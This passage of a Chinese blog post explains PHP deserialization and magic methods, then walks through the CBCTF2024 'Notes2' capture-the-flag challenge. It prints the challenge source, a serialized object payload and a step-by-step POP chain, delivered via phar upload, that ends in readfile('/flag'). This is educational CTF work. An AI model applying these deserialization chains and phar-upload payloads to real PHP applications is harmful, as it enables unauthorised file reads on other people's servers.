    <content type="html"><![CDATA[<h1 id="PHP反序列化小结"><a href="#PHP反序列化小结" class="headerlink" title="PHP反序列化小结"></a>PHP反序列化小结</h1><h1 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h1><p>首先，序列化是将对象转化为可存储或传输的字符串格式的过程。在 php 中，可以使用 serialize()函数将对象，数组或其它数据类型序列化称为一个字符串，以便将其保存到文件或者进行网络传输。</p><p>反序列化则是将之前序列化得到的字符串重新转换为原始的 php 数据结构或对象的过程。在 php 中，可以使用 unserialize()函数对序列化后的字符串进行反序列化操作。</p><p>如下即为某个对象序列化后的字符串样式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;_0rays&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;jbn&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pankas&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;O:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;go&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ed_xinhu&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;N;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>序列化的意义主要在于方便数据的存储和传输。</p><h1 id="反序列化漏洞的产生、利用原理"><a href="#反序列化漏洞的产生、利用原理" class="headerlink" title="反序列化漏洞的产生、利用原理"></a>反序列化漏洞的产生、利用原理</h1><p>反序列化漏洞的产生主要因为存在一些含魔术方法的可利用的类、用户可控的参数，通过设计各个类的属性参数，实现反序列化时各个魔术方法的自动（连锁）调用从而执行目的操作。目前我所接触到的一般的 PHP 反序列化漏洞通常搭配文件上传，服务器接收序列化的文件后我们通过一些操作让服务器对其进行反序列化处理。</p><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>（这里主要都是 PHP，其他的可能类似，还没有研究）</p><p>魔术方式是在特定情况下会自动调用的特殊方法，会覆盖 PHP 的默认操作，可以自定义方法的内容。做一些反序列化的题目时需要熟练掌握各个魔术方法的调用条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。<br><span class="hljs-title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。<br><span class="hljs-title function_ invoke__">__toString</span>():方法用于一个类被当成字符串时应怎样回应。例如<span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;应该显示些什么。 此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 <br><span class="hljs-title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；<br><span class="hljs-title function_ invoke__">__wakeup</span>():<span class="hljs-title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="hljs-title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。<br><span class="hljs-title function_ invoke__">__get</span>():当调用一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__set</span>():当设置一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__invoke</span>():调用函数的方式调用一个对象时的回应方法<br></code></pre></td></tr></table></figure><p>更全的魔术方法信息参考：<a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><h1 id="反序列化例题"><a href="#反序列化例题" class="headerlink" title="反序列化例题"></a>反序列化例题</h1><h2 id="CBCTF2024-Notes2"><a href="#CBCTF2024-Notes2" class="headerlink" title="CBCTF2024 Notes2"></a>CBCTF2024 Notes2</h2><p>题目提供了源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// easy unserialize chain OuO</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$realPath</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$realPath</span>, <span class="hljs-string">&#x27;/notes&#x27;</span>) === <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listnote</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$directory</span> = <span class="hljs-string">&#x27;/notes&#x27;</span>; <br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$directory</span>), function (<span class="hljs-variable">$file</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">directory</span>) &#123;<br>        <span class="hljs-title">return</span> <span class="hljs-title">is_file</span>(&quot;$<span class="hljs-title">directory</span>/$<span class="hljs-title">file</span>&quot;);<br>    &#125;);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>        <span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=/notes/&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&lt;/a&gt; &lt;p&gt;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$link</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=show-me-source&quot;&gt;show source&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br><br><span class="hljs-variable">$note</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;note&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span> === <span class="hljs-string">&quot;show-me-source&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$note</span>))&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=UTF-8&#x27;</span>);<br>            <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$note</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;这里是mak自己悄悄留给你的一些笔记哦，打开看看吧&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Notes List:&lt;h2&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">listnote</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="解题详细过程"><a href="#解题详细过程" class="headerlink" title="解题详细过程"></a>解题详细过程</h3><h4 id="1-初步观察分析，得到大致方向"><a href="#1-初步观察分析，得到大致方向" class="headerlink" title="1.初步观察分析，得到大致方向"></a>1.初步观察分析，得到大致方向</h4><p>很明确告知是反序列化题，可以在源码看到文件上传的接口，所以先上传序列化 phar 文件再触发反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><p>首先观察可利用的类及魔术方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">本题中存在的魔术方法：<br><span class="hljs-title function_ invoke__">__construct</span>():存在于**notes**类中，具有构造函数的类会在每次创建新对象时先调用此方法。<br><span class="hljs-title function_ invoke__">__toString</span>():存在于**lets**类中，方法用于一个类被当成字符串时应怎样回应。例如<span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;应该显示些什么。 <br><span class="hljs-title function_ invoke__">__wakeup</span>():存在于**_0rays**类中，<span class="hljs-title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="hljs-title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用__wakeup方法，预先准备对象需要的资源。<br><span class="hljs-title function_ invoke__">__get</span>():存在于**go**类中，当调用一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__set</span>():存在于**lets**类中，当设置一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__invoke</span>():存在于**lets**类中，调用函数的方式调用一个对象时的回应方法<br></code></pre></td></tr></table></figure><p>其次观察可利用于实现目的操作的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">发现目标存在于notes类中，只要让<span class="hljs-variable">$filepath</span>参数为<span class="hljs-string">&#x27;/flag&#x27;</span>即可通过<span class="hljs-title function_ invoke__">readfile</span>()获得flag：<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br></code></pre></td></tr></table></figure><p>再次，寻找首个触发的魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">发现目标存在于_0rays类中的<span class="hljs-title function_ invoke__">__wakeup</span>()，当发生反序列化时会优先调用该方法<br>所以可以作为反序列化攻击的入口，从该方法开始到<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$filepath</span>)方法的<span class="hljs-title function_ invoke__">readfile</span>()构造链子<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-深入分析，构造链子"><a href="#2-深入分析，构造链子" class="headerlink" title="2.深入分析，构造链子"></a>2.深入分析，构造链子</h4><p>这一步就需要结合每一个魔术方法的自动调用条件分析，然后以<u>套娃</u>的形式不断<u>将父类中的特定属性声明为调用魔术方法所在的类，实现魔术方法层层向目标调用的效果。</u>最后序列化生成 phar 文件用于上传。</p><p>1.__wakeup()作为入口：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>        <span class="hljs-comment">//call_user_func($this -&gt; jbn)存在时throw抛出，可令属性$jbn=&#x27;phpinfo&#x27;</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>            <span class="hljs-comment">//属性$pankas作为字符串被抛出，因此可以联想到lets类中的魔术方法__toString()</span><br>            <span class="hljs-comment">//lets类被当做字符串时自动调用魔术方法__toString()</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.令 $pankas 为 lets 类来衔接 lets 类中的魔术方法__toString()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-comment">//$mak4r1用md5加密后的倒数2~4位赋值给一个未声明的属性，联想到lets类中的魔术方法__set()</span><br>        <span class="hljs-comment">//lets类未声明的属性被赋值时自动调用魔术方法__set()</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span 